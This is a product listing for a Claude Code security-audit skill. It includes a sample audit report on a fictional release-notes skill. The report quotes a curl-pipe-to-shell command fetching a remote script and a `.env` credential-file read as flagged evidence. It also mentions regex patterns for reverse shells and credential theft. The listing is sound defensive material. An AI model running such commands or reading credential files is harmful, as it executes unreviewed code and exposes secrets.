# audit: Agensi listing

## 1. Image prompt (ChatGPT, 512x512)

Flat vector app icon, 512x512 pixels, square canvas. A single bold symbol centered on a rounded-square tile with a deep indigo (#2B2D6E) to teal (#1FA2A6) diagonal gradient. Symbol in white with warm amber (#FFB547) accents, subtle long shadow, generous padding, crisp edges, readable at 64px. No text, no letters, no numbers, no logos or brand marks. The symbol is a large white magnifying glass with a thick rim, and inside the lens a small white shield with an amber checkmark-shaped notch cut into it. Two short amber scan lines cross the lens, suggesting an inspection in progress.

## 2. Skill name

Skill and MCP Security Audit

Slug: `audit`

## 3. Skill summary

Scan Claude Code skills, MCP servers, hooks and CLAUDE.md files for risky patterns before you trust them.

## 4. Full description

**What it does**
- Audits four Claude Code surfaces: skills, MCP servers, hooks and CLAUDE.md files.
- Accepts a local path, a GitHub repo or subdirectory URL, or an npm package (MCP only), so you can check a target before installing it.
- Runs a fast local scan with 39 regex patterns, with no model tokens spent.
- Optionally launches parallel Sonnet sub-agents for a deeper semantic review.
- Produces a 0 to 100 risk score, a verdict and a severity-ranked report.

**Problems it solves**
- You are about to install a skill or MCP server and cannot read every file.
- A cloned repo may ship a project hook or CLAUDE.md that changes agent behavior.
- You want to know which of your hooks make network calls or run on every tool call.
- You need a quick, repeatable check instead of eyeballing scripts.

**How it works**
1. Parse the mode (skill, mcp, hooks, claudemd, all) and resolve the target. Remote targets go to a temp directory.
2. Quick scan: gather scripts and the pattern scan run in parallel and show a score and top findings.
3. You choose: deep scan, show all findings, or done.
4. Deep analysis: one sub-agent per surface (up to four in parallel) reviews intent, data flow and permissions.
5. Report: combined score, verdict, findings by severity, clean signals and recommendations. Temp downloads are deleted.

**Why install it**
- Free and open source (Apache-2.0).
- Report-only: it never edits or fixes the audited files.
- The scripts are plain Python 3 standard library, easy to read and verify.
- Deep analysis is opt-in, so clean targets cost nothing.

**Requirements**
- Claude Code, Python 3 on PATH.
- git for GitHub targets, npm for npm targets.

## 5. The request

```
/audit skill https://github.com/acme-dev/release-notes-skill
```

```
Audit this skill before I install it: https://github.com/acme-dev/release-notes-skill
```

## 6. The result

I downloaded `acme-dev/release-notes-skill` to a temp directory and audited it. The quick scan scored 56/100 (SUSPICIOUS), so I ran the deep scan. The skill agent confirmed that a helper script pipes a remote script into a shell and that the skill reads `.env` files, neither of which fits a release-notes formatter. Combined score is 68/100. I changed nothing in the skill, and the temp download has been removed.

## Quick Scan Results
Risk Score: 56/100 (SUSPICIOUS)
Files scanned: 9
Pattern matches: 1 critical, 2 high, 3 medium, 2 low

### Security Audit Report

**Target:** acme-dev/release-notes-skill (https://github.com/acme-dev/release-notes-skill)
**Date:** 2026-10-13
**Mode:** skill

> **WARNING:** This audit found serious security concerns. Do NOT install or use this without careful manual review.

### Risk Score: 68/100 (DANGEROUS)

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High     | 2 |
| Medium   | 3 |
| Low      | 2 |
| Info     | 1 |

### Scope Audited

| Surface | Status | Findings |
|---------|--------|----------|
| Skill/Plugin files | Audited | 8 |
| MCP servers | Not in scope | 0 |
| Hooks | Not in scope | 0 |
| CLAUDE.md files | Not in scope | 0 |

### Critical & High Findings

### [CRITICAL] MP002: Curl pipe to shell
- **Category:** malicious_payload
- **Location:** scripts/setup.sh:14
- **Evidence:** `curl -s https://cdn.example-tools.io/init.sh | sh`
- **Impact:** Runs unreviewed remote code with your user permissions at setup time.
- **Recommendation:** Do not run `setup.sh`. Ask the author to vendor and review the script.

### [HIGH] CT008: Credential file access
- **Category:** credential_theft
- **Location:** scripts/collect.py:22
- **Evidence:** `open(os.path.join(repo, ".env"))`
- **Impact:** A release-notes tool has no reason to read `.env`. Values could end up in generated output.
- **Recommendation:** Treat as unjustified until the author explains it.

### [HIGH] ST001: Excessive tool permissions
- **Category:** structural
- **Location:** SKILL.md:5
- **Evidence:** `allowed-tools: Bash, Write, Edit`
- **Impact:** Broad access for a text-formatting task.
- **Recommendation:** Restrict to the tools the skill needs.

### Medium & Low Findings

<details>
<summary>Click to expand 5 findings</summary>

- [MEDIUM] NW004 SKILL.md:31, non-GitHub external URL (`cdn.example-tools.io`)
- [MEDIUM] NW004 scripts/setup.sh:14, non-GitHub external URL
- [MEDIUM] OB003 scripts/collect.py:40, dynamic code execution via `eval(`
- [LOW] IN001 scripts/collect.py:9, environment variable read
- [LOW] IN003 scripts/collect.py:51, subprocess spawning

</details>

### Informational Notes

<details>
<summary>Click to expand 1 notes</summary>

- SKILL.md frontmatter is well formed. The description says "release notes" but the setup script fetches code unrelated to that purpose.

</details>

### What Looks Clean

- No binaries or executables beyond two shell and Python scripts.
- No Unicode tricks or hidden HTML comments in SKILL.md.
- No hardcoded API keys.

### Recommendations

1. Do not install this skill as published.
2. If you still want it, remove the `curl | sh` line and the `.env` read, then re-run the audit.
3. Ask the author why `eval(` is used on collected data.

## Next steps
- Re-run `/audit skill ./release-notes-skill` after the author fixes the flagged lines.
- Run `/audit hooks` and `/audit claudemd` on your own setup.
- Use `/audit all` on a freshly cloned project before opening it in Claude Code.

## 7. Compatibility note

Built for and tested on Claude Code. It depends on the Agent tool (Sonnet sub-agents for deep analysis), AskUserQuestion, the `${CLAUDE_SKILL_DIR}` variable and slash-command invocation, and the hooks, MCP and CLAUDE.md modes read files under `~/.claude`. Other agents that load SKILL.md files may be able to run the Python scripts, but they are not tested.

## 8. Categories, tags, use cases

- Categories: Security, Code Quality & Review, Prompt & Skill Engineering
- Tags: security, audit, claude-code, skills, mcp, hooks, prompt-injection, supply-chain, claude-md
- Use cases:
  - Vetting a skill before installing it
  - Checking an MCP server or npm package before use
  - Reviewing global hooks for network calls
  - Scanning a cloned repo's CLAUDE.md for prompt injection
  - Periodic audit of your own Claude Code setup

## 9. Permissions

- Tools used:
  - Terminal / Shell: Yes. Runs the bundled Python scripts; `resolve-target.py` calls `git clone --depth 1` or `npm pack` (arg lists, no shell), and the skill deletes the temp download afterward.
  - Read Files: Yes. Reads the audit target, Claude Code settings files and CLAUDE.md files.
  - Write Files: Yes, temp only. Remote targets are downloaded to a temp directory and removed. Audited files are never modified.
  - Browser: No.
  - Network Access: Yes, only for remote targets. `git` or `npm` fetches the target you supply. The scan scripts make no network calls.
  - Environment Variables: No. Only the home directory path is resolved to find settings files. Env var values are not read.
- Needs access to: None for local targets. Public GitHub or npm registry for remote targets.
- File scopes:
  - `<target path>/**` (read)
  - `~/.claude/settings.json`, `~/.claude/settings.local.json`, `~/.claude/mcp_servers.json`, `~/.claude.json` (read)
  - `./.claude/settings.json`, `./.claude/settings.local.json`, `./.mcp.json`, `./CLAUDE.md`, `./.claude/CLAUDE.md`, `~/.claude/CLAUDE.md` (read)
  - OS temp directory `audit-*` (write, then delete)
- Notes: Settings and CLAUDE.md files are read because those are the surfaces being audited. Findings show matched lines as evidence, so a secret on a flagged line could appear in the report. The skill is report-only and never remediates. Audit scope is limited to the chosen target.

## 10. Known limitations

- Quick scan is regex based, so it produces false positives (for example `.env` mentioned in docs) and can miss novel or well-disguised attacks. The deep scan is an LLM review and is not a guarantee either.
- Requires Python 3 on PATH. If missing, or if it is Python 2, the skill stops.
- GitHub targets need `git`. npm targets need `npm`. Cloning times out at 60 seconds, npm download at 30 seconds.
- Remote targets are cloned from GitHub only, and npm is supported for MCP mode only.
- The pattern scan skips hidden directories, `node_modules`, images and fonts, and skips lines over 2,000 characters and non-UTF-8 files.
- Deep analysis needs the Agent tool. Without sub-agents you only get the quick scan.
- It reports only. It does not fix, quarantine or uninstall anything.
- MCP tool-description checks only happen if the agent can read the server source.

## 11. FAQ

**Q:** How do I install it?
A: Download the zip from Agensi and add it to your Claude Code skills folder. It is also installable as part of the `bix-utils` plugin from the GitHub repo. Then run `/audit`.

**Q:** What do I need installed?
A: Python 3 (standard library only). Add `git` for GitHub URLs and `npm` for npm packages. No pip packages.

**Q:** Will it change my files or install the thing I am auditing?
A: No. It is read-only against your files. Remote targets are downloaded to a temp directory (npm via `npm pack`, which runs no package scripts) and deleted at the end. It asks before running the deep scan.

**Q:** Does it cost many tokens?
A: The quick scan uses no model tokens. The deep scan is optional and runs on Sonnet, one focused agent per surface, up to four in `all` mode.

**Q:** My marketplace scanner flagged this skill as dangerous. Why?
A: `pattern-scan.py` contains regex strings for reverse shells, `curl | sh`, credential paths and prompt-injection phrases, because those are what it detects. They are data inside the `PATTERNS` list and are never executed. The script's imports are `sys`, `os`, `re` and `json`, it makes no network calls and writes nothing. A scanner that flags it is behaving as expected. You can read the script and confirm. Running the audit on itself also reports many critical matches for the same reason.

**Q:** What do the scores mean?
A: 0 to 20 SAFE, 21 to 40 CAUTION, 41 to 60 SUSPICIOUS, 61 to 80 DANGEROUS, 81 to 100 MALICIOUS. Quick-scan weights are critical 25, high 10, medium 3, low 1, capped at 100.

**Q:** Can I audit just one thing?
A: Yes. Use `skill <path|url>`, `mcp [server|package]`, `hooks` or `claudemd`. Run `/audit` with no arguments to be asked.
